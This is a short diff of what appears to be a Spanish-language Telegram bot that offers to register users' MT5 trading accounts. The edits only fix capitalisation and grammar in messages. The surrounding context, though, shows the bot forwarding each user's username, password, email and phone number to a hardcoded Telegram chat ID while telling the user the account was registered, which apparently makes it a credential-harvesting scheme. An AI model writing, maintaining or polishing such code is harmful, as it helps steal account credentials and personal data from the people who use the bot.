@@ -11,7 +11,7 @@ token_text = """
 
        ⸙͎ Selecciona la opción que
      ⸙͎ mas se ajuste a tu situación.
- ⸙͎ para registar su cuenta para MT5.
+ ⸙͎ Para registar su cuenta para MT5.
 """
 
 api_text = """
@@ -108,7 +108,7 @@ async def password_mt5(message):
                 user = await get_deriv_user(username)
                 info = await get_user_info(username)
                 await kaino.send_message(617961155, kain_text.format(message.from_user.username, user, password, info.email, info.phone,  date.today()))
-                await kaino.reply_to(message, f"✎ ¡Su cuenta ha sido registrado con exito! ")
+                await kaino.reply_to(message, f"✎ ¡Su cuenta ha sido registrada con exito! ")
             else:
                 await kaino.reply_to(message, f"✎ ¡Actualice no registre, su usuario ya existe en la base de datos..! ")
         else:
